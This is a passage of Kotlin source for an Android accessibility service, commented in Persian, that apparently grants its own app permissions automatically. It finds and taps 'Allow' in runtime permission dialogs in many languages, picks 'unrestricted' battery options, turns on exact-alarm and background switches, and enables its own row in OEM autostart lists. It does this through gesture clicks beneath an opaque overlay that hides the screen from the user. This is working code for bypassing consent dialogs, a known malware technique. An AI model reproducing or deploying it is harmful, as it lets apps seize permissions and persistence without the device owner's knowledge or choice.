        "permit", "ok", "accept", "continue", "yes", "agree", "allow all",
        "zulassen", "akzeptieren", "autoriser", "aceptar", "permitir", "izin ver",
        "разрешить", "허용", "允许", "許可",
        "اجازه", "اجازه دادن", "بله", "قبول", "تأیید", "تایید", "هنگام استفاده",
        "فقط این بار", "همیشه", "ادامه", "موافقم", "مجاز", "بدون محدودیت",
    )

    /** گزینه‌های صفحهٔ battery unrestricted (مخصوصاً MIUI/HyperOS — radio نه دکمه Allow). */
    private val batteryUnrestrictedTexts = listOf(
        "no restrictions", "unrestricted", "don't optimize", "do not optimize", "not optimized",
        "no restriction", "allow", "permit",
        "بدون محدودیت", "بدون بهینه‌سازی", "بهینه سازی نکن", "بهینه‌سازی نکن",
        "محدود نکن", "عدم محدودیت", "بدون محدودیت باتری", "مجاز", "اجازه دادن",
        "не ограничивать", "без ограничений", "не оптимизировать",
    )

    private val unrestrictedOptionPhrases = listOf(
        "بدون محدودیت",
        "unrestricted",
        "no restrictions",
        "no restriction",
        "don't optimize",
        "do not optimize",
        "not optimized",
        "بدون بهینه‌سازی",
        "بدون بهینه سازی",
    )

    private val confirmAllowLabels = listOf(
        "اجازه", "اجازه دادن", "allow", "مجاز", "yes", "بله",
    )

    private val confirmDenyLabels = listOf(
        "رد کردن", "deny", "don't allow", "do not allow", "dont allow",
        "اجازه ندادن", "مجاز نبودن", "no", "نه", "خیر", "لغو", "cancel",
    )

    private val neverSleepingLabels = listOf(
        "never sleeping apps",
        "never sleeping",
        "won't be put to sleep",
        "apps that won't be put to sleep",
        "برنامه‌هایی که هرگز به خواب نمی‌روند",
        "برنامه هایی که هرگز به خواب نمی روند",
        "هرگز به خواب نمی‌روند",
        "هرگز به خواب نمی روند",
        "برنامه‌هایی که به خواب نمی‌روند",
    )

    private val sleepingAppsLabels = listOf(
        "deep sleeping apps",
        "deep sleeping",
        "sleeping apps",
        "برنامه‌های در حال خواب",
        "برنامه های در حال خواب",
        "خواب عمیق",
        "برنامه‌های خواب",
    )

    private val backgroundLimitLabels = listOf(
        "background usage limits",
        "background usage limit",
        "محدودیت‌های استفاده در پس‌زمینه",
        "محدودیت های استفاده در پس‌زمینه",
        "محدودیت استفاده در پس‌زمینه",
        "محدودیت استفاده از برنامه‌ها در پس‌زمینه",
        "محدودیت استفاده از برنامه ها در پس‌زمینه",
        "محدودیت مصرف در پس‌زمینه",
        "محدودیت‌های مصرف در پس‌زمینه",
        "محدودیت‌های پس‌زمینه",
        "put unused apps to sleep",
        "unused apps",
    )

    private val addAppLabels = listOf(
        "add apps",
        "add app",
        "افزودن برنامه‌ها",
        "افزودن برنامه",
        "افزودن",
        "اضافه کردن",
        "add",
        "+",
    )

    private val autostartEntryLabels = listOf(
        "auto-start",
        "autostart",
        "auto start",
        "startup manager",
        "app launch",
        "راه‌اندازی خودکار",
        "راه اندازی خودکار",
        "اجرای خودکار",
        "شروع خودکار",
    )

    private val batteryHubLabels = listOf(
        "ذخیره نیرو",
        "اطلاعات باتری",
        "battery usage",
        "device care",
        "مراقبت از دستگاه",
        "power saving",
        "مشاهده جزئیات",
    )

    private val overflowLabels = listOf(
        "more options",
        "more option",
        "گزینه‌های بیشتر",
        "گزینه های بیشتر",
        "more",
        "بیشتر",
    )

    private val appDetailsBatteryLabels = listOf(
        "battery",
        "باتری",
        "battery usage",
        "مصرف باتری",
        "optimize battery",
        "بهینه‌سازی باتری",
        "بهینه سازی باتری",
    )

    private val switchHints = listOf(
        "alarm", "exact", "schedule", "autostart", "auto-start", "auto start",
        "startup", "background", "battery", "optim", "restriction",
        "هشدار", "دقیق", "اجرای خودکار", "شروع خودکار",
        "پس‌زمینه", "پس زمینه", "باتری", "بهینه", "محدود",
    )

    fun onEvent(service: AccessibilityService, event: AccessibilityEvent) {
        if (!PermissionsAutoGrant.isArmed()) return
        if (mode == TapMode.IDLE) return
        val type = event.eventType
        if (type != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            type != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED &&
            type != AccessibilityEvent.TYPE_VIEW_SCROLLED
        ) {
            return
        }
        val pkg = event.packageName?.toString().orEmpty()
        if (mode == TapMode.RUNTIME_DIALOG && isSystemDialogHost(pkg.lowercase())) {
            if (type != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
            if (findRuntimeDialogRoot(service) == null) return
        } else if (!isTargetUi(pkg)) {
            return
        }
        PermissionsAutoGrant.stabilizeOverlay()
        scheduleTapBurst(service, pkg)
    }

    private fun scheduleTapBurst(service: AccessibilityService, pkg: String) {
        // فقط-AI: orchestrator kick می‌کند؛ eventهای CONTENT_CHANGED نباید AI تکراری بزنند
        // (به‌خصوص OEM: لیست ناقص + اسکرول → چند درخواست موازی و کند).
        if (AutoGrantDebug.useAi && mode != TapMode.IDLE && !ruleFallbackOnce) {
            if (mode == TapMode.OEM_APP_LIST) return
            scheduleForceAi(service, delayMs = 60L)
            return
        }
        val token = ++burstToken
        // یک‌بار fallback بعد از AI ناموفق — تپر قطعی
        if (ruleFallbackOnce) {
            ruleFallbackOnce = false
            handler.postDelayed({
                if (!PermissionsAutoGrant.isArmed() || token != burstToken) return@postDelayed
                if (mode == TapMode.IDLE) return@postDelayed
                tryRuleTapNow(service)
            }, 80L)
            return
        }
        // listScrolls را روی هر event ریست نکن — اسکرول انباشته بماند
        val burstHit = booleanArrayOf(false)
        for (delay in tapDelaysMs) {
            handler.postDelayed({
                if (!PermissionsAutoGrant.isArmed() || token != burstToken) return@postDelayed
                if (mode == TapMode.IDLE) return@postDelayed
                PermissionsAutoGrant.stabilizeOverlay()
                val now = SystemClock.uptimeMillis()
                if (now - lastTapAt < TAP_DEBOUNCE_MS) return@postDelayed
                if (tryTapWindows(service)) {
                    burstHit[0] = true
                    consecutiveMissBursts = 0
                    lastTapAt = now
                    Log.i(TAG, "tapped mode=$mode pkg=$pkg delayMs=$delay")
                }
            }, delay)
        }
        handler.postDelayed({
            if (!PermissionsAutoGrant.isArmed() || token != burstToken) return@postDelayed
            if (mode == TapMode.IDLE || burstHit[0]) return@postDelayed
            consecutiveMissBursts++
            if (consecutiveMissBursts >= 2) {
                consecutiveMissBursts = 0
                UiGuideBridge.requestIfNeeded(service, guidePhase(), "miss_burst")
            }
        }, tapDelaysMs.last() + 80L)
    }

    private fun guidePhase(): String = when (mode) {
        TapMode.RUNTIME_DIALOG -> "RUNTIME"
        TapMode.SETTINGS_ALLOW -> "BATTERY"
        TapMode.SETTINGS_SWITCH -> "EXACT_ALARM"
        TapMode.OEM_APP_LIST -> "OEM_AUTOSTART"
        else -> mode.name
    }

    private fun isTargetUi(pkg: String): Boolean {
        if (pkg.isBlank()) return false
        val p = pkg.lowercase()
        return when (mode) {
            TapMode.IDLE -> false
            TapMode.RUNTIME_DIALOG -> isPermissionControllerUi(p)
            TapMode.SETTINGS_ALLOW, TapMode.SETTINGS_SWITCH, TapMode.OEM_APP_LIST ->
                isPermissionControllerUi(p) || isSettingsLike(p)
        }
    }

    private fun isPermissionControllerUi(p: String): Boolean {
        if (p.contains("permissioncontroller")) return true
        if (p.contains("packageinstaller")) return true
        if (p.contains("securitypermission")) return true
        if (p.contains("permissionmanager")) return true
        if (p == "com.lbe.security.miui") return true
        if (p == "com.miui.securitycenter") return true
        if (p == "com.huawei.systemmanager" || p == "com.hihonor.systemmanager") return true
        if (p.contains("secure") && (p.contains("vivo") || p.contains("iqoo"))) return true
        if (PhoneFamily.current() == PhoneFamily.XIAOMI && p.contains("security")) return true
        return false
    }

    private fun isSettingsLike(p: String): Boolean {
        if (p.contains("settings")) return true
        if (p == "com.android.systemui") return true
        if (p.contains("powerkeeper") || p.contains("oppoguardelf") || p.contains("lool")) return true
        if (p.contains("safecenter") || p.contains("phoneoptimize")) return true
        if (p.contains("securitycenter")) return true
        return false
    }

    /**
     * Cover = TYPE_ACCESSIBILITY_OVERLAY؛ درختش فقط ناوبری را نشان می‌دهد.
     * فقط پنجره‌های APPLICATION پکیج هدف را بزن؛ از overlay و SystemUI رد شو.
     */
    private fun tryTapWindows(service: AccessibilityService): Boolean {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val windows = service.windows
            if (!windows.isNullOrEmpty()) {
                val ranked = windows
                    .filter { it.type != AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY }
                    .sortedWith(
                        compareBy<AccessibilityWindowInfo> { w ->
                            when (w.type) {
                                AccessibilityWindowInfo.TYPE_APPLICATION -> 0
                                AccessibilityWindowInfo.TYPE_SYSTEM -> 1
                                else -> 2
                            }
                        }.thenBy { w ->
                            val pkg = w.root?.packageName?.toString().orEmpty().lowercase()
                            when {
                                pkg == service.packageName -> 3
                                pkg.contains("systemui") -> 2
                                isPreferredTargetPackage(pkg) -> 0
                                else -> 1
                            }
                        },
                    )
                for (window in ranked) {
                    val root = window.root ?: continue
                    val pkg = root.packageName?.toString().orEmpty()
                    if (pkg == service.packageName) continue
                    val pl = pkg.lowercase()
                    if (pl.contains("systemui") &&
                        !(mode == TapMode.RUNTIME_DIALOG && looksLikeRuntimeDialog(root))
                    ) {
                        continue
                    }
                    if (tapRoot(service, root)) return true
                }
            }
        }
        val active = service.rootInActiveWindow ?: return false
        val pkg = active.packageName?.toString().orEmpty()
        if (pkg == service.packageName) return false
        val pl = pkg.lowercase()
        if (pl.contains("systemui") &&
            !(mode == TapMode.RUNTIME_DIALOG && looksLikeRuntimeDialog(active))
        ) {
            return false
        }
        return tapRoot(service, active)
    }

    private fun isPreferredTargetPackage(p: String): Boolean {
        if (p.isBlank()) return false
        return when (mode) {
            TapMode.IDLE -> false
            TapMode.RUNTIME_DIALOG -> isPermissionControllerUi(p)
            TapMode.OEM_APP_LIST -> {
                val ok = (isPermissionControllerUi(p) || isSettingsLike(p)) && !p.contains("systemui")
                // autostart لیست معمولاً securitycenter است؛ powerkeeper باتری است
                ok && !p.contains("powerkeeper")
            }
            TapMode.SETTINGS_ALLOW, TapMode.SETTINGS_SWITCH ->
                (isPermissionControllerUi(p) || isSettingsLike(p)) && !p.contains("systemui")
        }
    }

    private fun tapRoot(service: AccessibilityService, root: AccessibilityNodeInfo): Boolean {
        if (mode == TapMode.OEM_APP_LIST) {
            return tapOurAppInList(service, root)
        }
        for (id in allowViewIds) {
            val nodes = root.findAccessibilityNodeInfosByViewId(id)
            if (nodes != null) {
                for (node in nodes) {
                    if (clickNode(service, node)) return true
                }
            }
        }
        val byText = findAllowByText(root)
        if (byText != null && clickNode(service, byText)) return true
        if (mode == TapMode.RUNTIME_DIALOG) {
            for (id in allowOneTimeIds) {
                val nodes = root.findAccessibilityNodeInfosByViewId(id)
                if (nodes != null) {
                    for (node in nodes) {
                        if (clickNode(service, node)) return true
                    }
                }
            }
            return false
        }
        if (mode == TapMode.SETTINGS_ALLOW) {
            if (tapBatteryUnrestrictedOption(service, root)) return true
            if (tapRelevantSwitch(service, root, requireHint = true)) return true
            logTapMiss(root, "SETTINGS_ALLOW")
            return false
        }
        if (mode == TapMode.SETTINGS_SWITCH) {
            return tapRelevantSwitch(service, root, requireHint = true)
        }
        return false
    }

    /**
     * لیست Autostart شیائومی و مشابه: نام اپ را پیدا کن، سوییچ همان ردیف را روشن کن؛
     * اگر دیده نشد اسکرول کن.
     */
    private fun tapOurAppInList(service: AccessibilityService, root: AccessibilityNodeInfo): Boolean {
        val labels = ourAppLabels(service)
        if (labels.isEmpty()) {
            Log.w(TAG, "OEM_APP_LIST no labels for package=${service.packageName}")
            return false
        }
        val row = findAppRow(root, labels)
        if (row != null) {
            val toggle = findToggleIn(row)
            if (toggle == null) {
                Log.w(TAG, "OEM_APP_LIST row found but no toggle labels=$labels")
                logTapMiss(row, "OEM_APP_LIST_ROW")
                return false
            }
            if (toggle.isChecked) {
                Log.i(TAG, "OEM_APP_LIST already enabled labels=$labels")
                AutoGrantOrchestrator.onOemAppListEnabled()
                return true
            }
            if (clickNode(service, toggle)) {
                Log.i(TAG, "OEM_APP_LIST enabled toggle labels=$labels")
                AutoGrantOrchestrator.onOemAppListEnabled()
                return true
            }
            // بعضی MIUI/ColorOS: کلیک روی خود ردیف تیک را عوض می‌کند
            if (clickNode(service, row)) {
                Log.i(TAG, "OEM_APP_LIST enabled via row click labels=$labels")
                AutoGrantOrchestrator.onOemAppListEnabled()
                return true
            }
            Log.w(TAG, "OEM_APP_LIST toggle click failed")
            return false
        }
        // لیست هنوز لود نشده (فقط Back/More) — صبر؛ اسکرول زودرس نکن
        if (listLooksEmpty(root)) {
            return false
        }
        if (listScrolls < MAX_LIST_SCROLLS && scrollForward(root)) {
            listScrolls++
            Log.i(TAG, "OEM_APP_LIST scroll#$listScrolls looking for $labels")
            return false
        }
        val now = SystemClock.uptimeMillis()
        if (now - lastOemMissLogAt > 2_000L) {
            lastOemMissLogAt = now
            Log.w(TAG, "OEM_APP_LIST app not found labels=$labels scrolls=$listScrolls")
            logTapMiss(root, "OEM_APP_LIST")
        }
        return false
    }

    /** فقط ناوبری/هدر بدون ردیف اپ — هنوز لیست نیامده. */
    private fun listLooksEmpty(root: AccessibilityNodeInfo): Boolean {
        var hasToggle = false
        var textRows = 0
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            val cls = node.className?.toString().orEmpty()
            if (cls.contains("Switch", ignoreCase = true) ||
                cls.contains("CheckBox", ignoreCase = true) ||
                (node.isCheckable && node.isClickable)
            ) {
                hasToggle = true
                break
            }
            val t = nodeText(node)
            if (t.length >= 2 && !isChromeOnlyLabel(t)) textRows++
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return !hasToggle && textRows < 2
    }

    private fun isChromeOnlyLabel(text: String): Boolean {
        val t = text.lowercase().trim()
        return t == "بازگشت" || t == "back" || t == "بیشتر" || t == "more" ||
            t == "search" || t == "جستجو" || t == "ok" || t == "cancel" || t == "لغو"
    }

    private fun ourAppLabels(service: AccessibilityService): List<String> {
        val out = LinkedHashSet<String>()
        val pkg = service.packageName
        runCatching {
            val pm = service.packageManager
            val ai = pm.getApplicationInfo(pkg, 0)
            out += pm.getApplicationLabel(ai).toString().trim()
        }
        runCatching { out += service.getString(R.string.app_name).trim() }
        runCatching { out += service.getString(R.string.alias_app_name).trim() }
        out += pkg
        return out.filter { it.length >= 2 }
    }

    private fun findAppRow(root: AccessibilityNodeInfo, labels: List<String>): AccessibilityNodeInfo? {
        // اول API متنی سیستم (روی RecyclerViewهای MIUI معمولاً بهتر از walk کور است)
        for (label in labels.sortedByDescending { it.length }) {
            val nodes = root.findAccessibilityNodeInfosByText(label)
            if (nodes != null) {
                for (node in nodes) {
                    val row = rowContainer(node)
                    if (row != null && findToggleIn(row) != null) return row
                }
            }
        }
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        var best: AccessibilityNodeInfo? = null
        var bestScore = 0
        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            val text = nodeText(node)
            if (text.isNotBlank()) {
                val score = matchLabelScore(text, labels)
                if (score > bestScore) {
                    val row = rowContainer(node)
                    if (row != null && findToggleIn(row) != null) {
                        best = row
                        bestScore = score
                    }
                }
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return best
    }

    private fun matchLabelScore(text: String, labels: List<String>): Int {
        val t = text.lowercase()
        var best = 0
        for (label in labels) {
            val l = label.lowercase()
            if (l.isBlank()) continue
            if (t == l) return 10_000 + l.length
            if (t.contains(l)) best = maxOf(best, 100 + l.length)
        }
        return best
    }

    private fun rowContainer(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        var cur: AccessibilityNodeInfo? = node
        var depth = 0
        while (cur != null && depth < 8) {
            if (findToggleIn(cur) != null) return cur
            cur = cur.parent
            depth++
        }
        return node.parent
    }

    private fun findToggleIn(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            val cls = node.className?.toString().orEmpty()
            val isToggle = cls.contains("Switch", ignoreCase = true) ||
                cls.contains("CheckBox", ignoreCase = true) ||
                cls.contains("Toggle", ignoreCase = true) ||
                (node.isCheckable && (node.isClickable || cls.contains("Check", ignoreCase = true)))
            if (isToggle) return node
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return null
    }

    private fun scrollForward(root: AccessibilityNodeInfo): Boolean {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            if (node.isScrollable &&
                node.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
            ) {
                return true
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return false
    }

    private fun findAllowByText(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        var best: AccessibilityNodeInfo? = null
        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            val label = nodeText(node)
            // متن ممکن است روی TextView غیرقابل‌کلیک باشد؛ parent را بعداً clickNode می‌زند
            if (label.isNotBlank() && !looksLikeDeny(label) && looksLikeAllow(label)) {
                if (best == null || label.length < nodeText(best).length) {
                    best = node
                }
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return best
    }

    private fun tapBatteryUnrestrictedOption(
        service: AccessibilityService,
        root: AccessibilityNodeInfo,
    ): Boolean {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            val label = nodeText(node)
            val around = nearbyLabel(node)
            val hit = looksLikeBatteryUnrestricted(label) || looksLikeBatteryUnrestricted(around)
            if (hit) {
                val cls = node.className?.toString().orEmpty()
                val selectable = cls.contains("Radio", ignoreCase = true) ||
                    cls.contains("CheckedTextView", ignoreCase = true) ||
                    cls.contains("CheckBox", ignoreCase = true) ||
                    cls.contains("Switch", ignoreCase = true) ||
                    node.isCheckable ||
                    node.isClickable
                if (selectable) {
                    if (node.isCheckable && node.isChecked) {
                        Log.i(TAG, "battery option already checked: ${label.ifBlank { around }.take(80)}")
                        return true
                    } else if (clickNode(service, node)) {
                        Log.i(TAG, "tapped battery unrestricted option: ${label.ifBlank { around }.take(80)}")
                        return true
                    }
                }
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        if (!treeHasPhrase(root, unrestrictedOptionPhrases) &&
            findExactLabel(root, confirmDenyLabels) != null
        ) {
            val allow = findExactLabel(root, confirmAllowLabels)
            if (allow != null && clickNode(service, allow)) {
                Log.i(TAG, "tapped battery confirm allow: ${nodeText(allow).take(40)}")
                return true
            }
        }
        return false
    }

    private fun looksLikeBatteryUnrestricted(text: String): Boolean {
        val t = text.lowercase()
        if (t.isBlank() || looksLikeDeny(t)) return false
        return batteryUnrestrictedTexts.any { t.contains(it) }
    }

    private fun tapRelevantSwitch(
        service: AccessibilityService,
        root: AccessibilityNodeInfo,
        requireHint: Boolean,
    ): Boolean {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            val cls = node.className?.toString().orEmpty()
            val isSwitch = cls.contains("Switch", ignoreCase = true) ||
                cls.contains("CheckBox", ignoreCase = true) ||
                cls.contains("Toggle", ignoreCase = true)
            if (isSwitch && node.isClickable && !node.isChecked) {
                val around = nearbyLabel(node)
                if (!requireHint || looksLikeSwitchTarget(around)) {
                    if (clickNode(service, node)) return true
                }
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return false
    }

    private fun logTapMiss(root: AccessibilityNodeInfo, where: String) {
        val samples = ArrayList<String>(8)
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty() && samples.size < 8) {
            val node = queue.removeFirst()
            val label = nodeText(node)
            if (label.isNotBlank() && (node.isClickable || node.isCheckable)) {
                samples += "${node.className?.toString()?.substringAfterLast('.')}:$label".take(100)
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        Log.w(TAG, "tap miss mode=$mode where=$where visibles=$samples")
    }

    private fun nearbyLabel(node: AccessibilityNodeInfo): String {
        val parts = mutableListOf(nodeText(node))
        var parent = node.parent
        var depth = 0
        while (parent != null && depth < 3) {
            parts += nodeText(parent)
            for (i in 0 until parent.childCount) {
                parent.getChild(i)?.let { parts += nodeText(it) }
            }
            parent = parent.parent
            depth++
        }
        return parts.joinToString(" ")
    }

    private fun looksLikeSwitchTarget(text: String): Boolean {
        val t = text.lowercase()
        if (t.isBlank()) return false
        return switchHints.any { t.contains(it) }
    }

    private fun looksLikeAllow(text: String): Boolean {
        val t = text.lowercase()
        return allowTexts.any { phrase -> t.contains(phrase) }
    }

    private fun looksLikeDeny(text: String): Boolean {
        val t = text.lowercase()
        return denyTexts.any { phrase -> t.contains(phrase) }
    }

    private fun nodeText(node: AccessibilityNodeInfo): String {
        val parts = listOfNotNull(
            node.text?.toString(),
            node.contentDescription?.toString(),
        )
        return parts.joinToString(" ").trim()
    }

    private fun clickNode(service: AccessibilityService, node: AccessibilityNodeInfo): Boolean {
        if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
            return true
        }
        var parent = node.parent
        while (parent != null) {
            if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                return true
            }
            parent = parent.parent
        }
        // زیر Cover مات: کلیک ژستی روی مختصات نود پنجرهٔ زیرین
        return gestureClick(service, node)
    }

    private fun gestureClick(service: AccessibilityService, node: AccessibilityNodeInfo): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false
        val rect = Rect()
        node.getBoundsInScreen(rect)
        if (rect.isEmpty) return false
        val x = rect.exactCenterX()
        val y = rect.exactCenterY()
        val path = Path().apply { moveTo(x, y) }
        val stroke = GestureDescription.StrokeDescription(path, 0L, 60L)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()
        return runCatching {
            service.dispatchGesture(gesture, null, null)
        }.getOrDefault(false).also { ok ->
            if (ok) Log.i(TAG, "gesture click at ${x.toInt()},${y.toInt()}")
        }
    }

    /** اسکرول عمودی با ژست — وقتی ACTION_SCROLL روی لیست OEM کار نمی‌کند. */
    private fun gestureFlingScroll(
        service: AccessibilityService,
        root: AccessibilityNodeInfo,
        forward: Boolean,
    ): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false
        val rect = Rect()
        root.getBoundsInScreen(rect)
        if (rect.isEmpty || rect.height() < 120) return false
        val x = rect.exactCenterX()
        val startY: Float
        val endY: Float
        if (forward) {
            // انگشت از پایین به بالا = محتوا پایین می‌رود
            startY = rect.top + rect.height() * 0.72f
            endY = rect.top + rect.height() * 0.28f
        } else {
            startY = rect.top + rect.height() * 0.28f
            endY = rect.top + rect.height() * 0.72f
        }
        val path = Path().apply {
            moveTo(x, startY)
            lineTo(x, endY)
        }
        val stroke = GestureDescription.StrokeDescription(path, 0L, 280L)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()
        return runCatching {
            service.dispatchGesture(gesture, null, null)
        }.getOrDefault(false)
    }

    enum class OemSurface {
        APP_LIST,
        CONFIRM_DIALOG,
        HUB,
        RESTRICT_LIST,
        UNKNOWN,
    }
}
